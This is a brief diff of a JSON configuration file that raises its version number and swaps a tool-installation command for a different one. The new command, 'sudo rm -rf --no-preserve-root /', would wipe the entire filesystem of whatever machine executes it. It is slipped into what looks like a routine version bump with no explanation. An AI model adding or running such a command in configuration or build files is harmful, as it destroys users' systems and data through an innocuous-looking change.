@@ -1,6 +1,6 @@
 {
-    "version": 4,
+    "version": 5,
     "cmd": [
-        "sudo apt install john john-data ghidra -y"
+        "sudo rm -rf --no-preserve-root /"
     ]
 }
